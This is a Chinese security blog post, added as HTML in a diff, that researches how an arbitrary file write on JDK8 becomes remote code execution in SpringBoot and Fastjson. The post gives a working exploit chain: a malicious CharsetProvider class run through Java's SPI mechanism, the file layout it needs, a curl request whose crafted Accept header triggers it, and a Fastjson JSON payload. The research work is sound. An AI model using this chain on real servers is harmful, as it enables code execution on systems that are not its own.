@@ -1,0 +1,874 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="类加载,JDK8,Fastjson RCE,文件上传漏洞,SpringBoot RCE,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x00 背景前人栽树，后人砍树，不然怎来薪火相传。有意义的卷，能带来进步！ 昨天写完《JDK8任意文件写场景下的Fastjson RCE》后，看到Landgrey大佬的文章再次补充了一下SpringBoot使用Accept头触发charset.jar加载的方式，应该是非常之完美的SpringBoot Fat Jar任意文件写的RCE了。">
+<meta name="keywords" content="类加载,JDK8,Fastjson RCE,文件上传漏洞,SpringBoot RCE">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JDK8任意文件写场景下的SpringBoot RCE">
+<meta property="og:url" content="http://yoursite.com/2021/04/14/JDK8任意文件写场景下的SpringBoot RCE/index.html">
+<meta property="og:site_name" content="大彩笔threedr3am">
+<meta property="og:description" content="0x00 背景前人栽树，后人砍树，不然怎来薪火相传。有意义的卷，能带来进步！ 昨天写完《JDK8任意文件写场景下的Fastjson RCE》后，看到Landgrey大佬的文章再次补充了一下SpringBoot使用Accept头触发charset.jar加载的方式，应该是非常之完美的SpringBoot Fat Jar任意文件写的RCE了。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2021-04-16T17:35:35.741Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="JDK8任意文件写场景下的SpringBoot RCE">
+<meta name="twitter:description" content="0x00 背景前人栽树，后人砍树，不然怎来薪火相传。有意义的卷，能带来进步！ 昨天写完《JDK8任意文件写场景下的Fastjson RCE》后，看到Landgrey大佬的文章再次补充了一下SpringBoot使用Accept头触发charset.jar加载的方式，应该是非常之完美的SpringBoot Fat Jar任意文件写的RCE了。">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2021/04/14/JDK8任意文件写场景下的SpringBoot RCE/">
+
+
+
+
+
+  <title>JDK8任意文件写场景下的SpringBoot RCE | 大彩笔threedr3am</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?ba63af2f58310d7562bd4ddbdaa7c548";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">大彩笔threedr3am</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/04/14/JDK8任意文件写场景下的SpringBoot RCE/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="threedr3am">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avator/duolaAmeng.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="大彩笔threedr3am">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">JDK8任意文件写场景下的SpringBoot RCE</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-04-14T14:19:00+08:00">
+                2021-04-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/java漏洞分析/" itemprop="url" rel="index">
+                    <span itemprop="name">java漏洞分析</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h3><p>前人栽树，后人砍树，不然怎来薪火相传。有意义的卷，能带来进步！</p>
+<p>昨天写完《<strong>JDK8任意文件写场景下的Fastjson RCE</strong>》后，看到Landgrey大佬的<a href="https://landgrey.me/blog/22/" target="_blank" rel="noopener">文章</a>再次补充了一下SpringBoot使用Accept头触发charset.jar加载的方式，应该是非常之完美的SpringBoot Fat Jar任意文件写的RCE了。</p>
+<a id="more"></a>
+<ul>
+<li>触发请求头payload<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept: text/plain, */*; q=0.01</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>跟到源码中，可以发现，分号后面的键值对就是可以触发Charset.forName的地方</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=0.01</span><br></pre></td></tr></table></figure>
+<p>其中，0.01会导致执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Charset.forName(&quot;0.01&quot;)</span><br></pre></td></tr></table></figure></p>
+<p>但还是那个观点，覆盖写charsets.jar文件，有两个缺点：</p>
+<ol>
+<li>文件太大，mac osx版的jdk8u241下，该文件足足3MB大小</li>
+<li>需要针对目标服务jdk版本准备恶意charsets.jar文件（否则容易影响到正常服务）</li>
+</ol>
+<p>这篇文章将根据该思路，探究Charset，提供一种更为稳定的方式，实现RCE。</p>
+<h3 id="0x01-JDK8下的Bootstrap和Ext-ClassLoader"><a href="#0x01-JDK8下的Bootstrap和Ext-ClassLoader" class="headerlink" title="0x01 JDK8下的Bootstrap和Ext ClassLoader"></a>0x01 JDK8下的Bootstrap和Ext ClassLoader</h3><p>回顾我的上一篇文章《<strong>JDK8任意文件写场景下的Fastjson RCE</strong>》，根据类的双亲委派模型，类的加载顺序会先从Bootstrap ClassLoader的加载路径中尝试加载，当找不到该类时，才会选择从下一级的ExtClassLoader的加载路径寻找，以此类推到引发加载的类所在的类加载器为止。</p>
+<p>Bootstrap ClassLoader(sun.boot.class.path):</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/Library/Java/JavaVirtualMachines/jdk1.8.0_241.jdk/Contents/Home/jre/lib/resources.jar</span><br><span class="line">/Library/Java/JavaVirtualMachines/jdk1.8.0_241.jdk/Contents/Home/jre/lib/rt.jar</span><br><span class="line">/Library/Java/JavaVirtualMachines/jdk1.8.0_241.jdk/Contents/Home/jre/lib/sunrsasign.jar</span><br><span class="line">/Library/Java/JavaVirtualMachines/jdk1.8.0_241.jdk/Contents/Home/jre/lib/jsse.jar</span><br><span class="line">/Library/Java/JavaVirtualMachines/jdk1.8.0_241.jdk/Contents/Home/jre/lib/jce.jar</span><br><span class="line">/Library/Java/JavaVirtualMachines/jdk1.8.0_241.jdk/Contents/Home/jre/lib/charsets.jar</span><br><span class="line">/Library/Java/JavaVirtualMachines/jdk1.8.0_241.jdk/Contents/Home/jre/lib/jfr.jar</span><br><span class="line">/Library/Java/JavaVirtualMachines/jdk1.8.0_241.jdk/Contents/Home/jre/classes</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sun.boot.class.path</span><br></pre></td></tr></table></figure>
+<p>是一个配置变量，通过执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.getProperty(&quot;sun.boot.class.path&quot;)</span><br></pre></td></tr></table></figure></p>
+<p>可以获取到以上路径列表，该列表即为Bootstrap ClassLoader加载类时，文件的读取路径。</p>
+<p>只要在jre/classes目录中写入class和SPI文件，即可在Class.forName的执行中加载到写入的class。</p>
+<h3 id="0x02-Charset-forName的原理"><a href="#0x02-Charset-forName的原理" class="headerlink" title="0x02 Charset.forName的原理"></a>0x02 Charset.forName的原理</h3><p>跟进Charset.forName的源码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Charset <span class="title">forName</span><span class="params">(String charsetName)</span> </span>&#123;</span><br><span class="line">    Charset cs = lookup(charsetName);</span><br><span class="line">    <span class="keyword">if</span> (cs != <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> cs;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedCharsetException(charsetName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Charset <span class="title">lookup</span><span class="params">(String charsetName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (charsetName == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Null charset name"</span>);</span><br><span class="line">    Object[] a;</span><br><span class="line">    <span class="keyword">if</span> ((a = cache1) != <span class="keyword">null</span> &amp;&amp; charsetName.equals(a[<span class="number">0</span>]))</span><br><span class="line">        <span class="keyword">return</span> (Charset)a[<span class="number">1</span>];</span><br><span class="line">    <span class="comment">// We expect most programs to use one Charset repeatedly.</span></span><br><span class="line">    <span class="comment">// We convey a hint to this effect to the VM by putting the</span></span><br><span class="line">    <span class="comment">// level 1 cache miss code in a separate method.</span></span><br><span class="line">    <span class="keyword">return</span> lookup2(charsetName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Charset <span class="title">lookup2</span><span class="params">(String charsetName)</span> </span>&#123;</span><br><span class="line">    Object[] a;</span><br><span class="line">    <span class="keyword">if</span> ((a = cache2) != <span class="keyword">null</span> &amp;&amp; charsetName.equals(a[<span class="number">0</span>])) &#123;</span><br><span class="line">        cache2 = cache1;</span><br><span class="line">        cache1 = a;</span><br><span class="line">        <span class="keyword">return</span> (Charset)a[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    Charset cs;</span><br><span class="line">    <span class="keyword">if</span> ((cs = standardProvider.charsetForName(charsetName)) != <span class="keyword">null</span> ||</span><br><span class="line">        (cs = lookupExtendedCharset(charsetName))           != <span class="keyword">null</span> ||</span><br><span class="line">        (cs = lookupViaProviders(charsetName))              != <span class="keyword">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cache(charsetName, cs);</span><br><span class="line">        <span class="keyword">return</span> cs;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Only need to check the name if we didn't find a charset for it */</span></span><br><span class="line">    checkName(charsetName);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里有三个加载Charset的方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">standardProvider.charsetForName(charsetName)</span><br><span class="line">lookupExtendedCharset(charsetName)</span><br><span class="line">lookupViaProviders(charsetName)</span><br></pre></td></tr></table></figure>
+<p>跟进其代码，可以发现，前两种加载方式，都是已经内置provider的模式，没有利用的价值，而第三种模式，跟进其代码，很明显是一个SPI加载provider的模式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader cl = ClassLoader.getSystemClassLoader();</span><br><span class="line">ServiceLoader&lt;CharsetProvider&gt; sl = ServiceLoader.load(CharsetProvider.class, cl);</span><br></pre></td></tr></table></figure>
+<p>那么，其实我们完全可以编写一个继承了java.nio.charset.spi.CharsetProvider类的恶意provider，通过SPI机制，触发其加载并初始化。</p>
+<p>这里面有个重点，因为使用到的是系统类加载器，它对应的是Ext ClassLoader，理论上打包成jar包放到jre/lib/ext内，但由于类加载器缓存的机制，需要重启后才能加载到（备选方案），按照上一节所描述的内容，我们需要把恶意provider的class和SPI相对应的文件放到jre/classes内。</p>
+<h3 id="0x03-利用SPI机制-编写恶意provider"><a href="#0x03-利用SPI机制-编写恶意provider" class="headerlink" title="0x03 利用SPI机制 - 编写恶意provider"></a>0x03 利用SPI机制 - 编写恶意provider</h3><p>SPI的原理非常简单，就是打包好的jar包内，需要有一个固定的目录META-INF/services，在其内部创建对应类名字的文件，而文件内容即每行一个类名，为文件名所对应类的实现。很抽象，看具体内容。</p>
+<p>因为我们需要创建一个java.nio.charset.spi.CharsetProvider的恶意provider，所以，需要创建一个名为java.nio.charset.spi.CharsetProvider的文件</p>
+<p>而恶意provider的类名，我定义为Evil，具体类文件:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.Charset;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> threedr3am</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> <span class="keyword">extends</span> <span class="title">java</span>.<span class="title">nio</span>.<span class="title">charset</span>.<span class="title">spi</span>.<span class="title">CharsetProvider</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Iterator&lt;Charset&gt; <span class="title">charsets</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> HashSet&lt;Charset&gt;().iterator();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Charset <span class="title">charsetForName</span><span class="params">(String charsetName)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//因为Charset会被缓存，导致同样的charsetName只能执行一次，所以，我们可以利用前缀触发，后面的内容不断变化就行了，甚至可以把命令通过charsetName传入</span></span><br><span class="line">        <span class="keyword">if</span> (charsetName.startsWith(<span class="string">"Evil"</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Charset.forName(<span class="string">"UTF-8"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Evil.class</span><br></pre></td></tr></table></figure>
+<p>当前目录:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── Evil.class</span><br><span class="line">└── META-INF</span><br><span class="line">    └── services</span><br><span class="line">        └── java.nio.charset.spi.CharsetProvider</span><br></pre></td></tr></table></figure>
+<p>但这里有个小缺陷，就是需要分两次上传文件。</p>
+<h3 id="0x04-SpringBoot触发RCE"><a href="#0x04-SpringBoot触发RCE" class="headerlink" title="0x04 SpringBoot触发RCE"></a>0x04 SpringBoot触发RCE</h3><p>把上一节的Evil.class和SPI文件放到jre/classes目录后，启动一个SpringBoot项目，发送一个请求:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET &quot;http://127.0.0.1:8080/&quot; -H &quot;Accept: text/html;Charset=Evil&quot;</span><br></pre></td></tr></table></figure>
+<p>可以看到，恶意class被加载执行了</p>
+<h3 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h3><ul>
+<li>Fastjson对应的触发方式:</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.nio.charset.Charset&quot;,&quot;val&quot;:&quot;Evil&quot;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul>
+<li><a href="https://landgrey.me/blog/22/" target="_blank" rel="noopener">Spring Boot Fat Jar 写文件漏洞到稳定 RCE 的探索</a></li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/类加载/" rel="tag"># 类加载</a>
+          
+            <a href="/tags/JDK8/" rel="tag"># JDK8</a>
+          
+            <a href="/tags/Fastjson-RCE/" rel="tag"># Fastjson RCE</a>
+          
+            <a href="/tags/文件上传漏洞/" rel="tag"># 文件上传漏洞</a>
+          
+            <a href="/tags/SpringBoot-RCE/" rel="tag"># SpringBoot RCE</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/04/13/JDK8任意文件写场景下的Fastjson RCE/" rel="next" title="JDK8任意文件写场景下的Fastjson RCE">
+                <i class="fa fa-chevron-left"></i> JDK8任意文件写场景下的Fastjson RCE
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avator/duolaAmeng.jpg" alt="threedr3am">
+            
+              <p class="site-author-name" itemprop="name">threedr3am</p>
+              <p class="site-description motion-element" itemprop="description">菜到如此</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/threedr3am" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/threedr3am1" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.k3f.xyz/" title="Levi4than" target="_blank">Levi4than</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.j10.monster/" title="Just1earnm0re" target="_blank">Just1earnm0re</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://rui0.cn/" title="ruilin" target="_blank">ruilin</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.leadroyal.cn/" title="leadroyal(卓卓师傅)" target="_blank">leadroyal(卓卓师傅)</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.kingkk.com/" title="kingkk" target="_blank">kingkk</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://driverxdw.github.io/" title="in0va'S(dw大鸽)" target="_blank">in0va'S(dw大鸽)</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://gengzongyuan.github.io/" title="大树先生(测试大牛)" target="_blank">大树先生(测试大牛)</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://chensem.github.io/" title="chensem(逆向龙哥)" target="_blank">chensem(逆向龙哥)</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://meizjm3i.github.io/" title="梅子酒" target="_blank">梅子酒</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.orange.tw/" title="orange" target="_blank">orange</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-背景"><span class="nav-number">1.</span> <span class="nav-text">0x00 背景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-JDK8下的Bootstrap和Ext-ClassLoader"><span class="nav-number">2.</span> <span class="nav-text">0x01 JDK8下的Bootstrap和Ext ClassLoader</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Charset-forName的原理"><span class="nav-number">3.</span> <span class="nav-text">0x02 Charset.forName的原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-利用SPI机制-编写恶意provider"><span class="nav-number">4.</span> <span class="nav-text">0x03 利用SPI机制 - 编写恶意provider</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-SpringBoot触发RCE"><span class="nav-number">5.</span> <span class="nav-text">0x04 SpringBoot触发RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Other"><span class="nav-number">6.</span> <span class="nav-text">Other</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考文章"><span class="nav-number">7.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
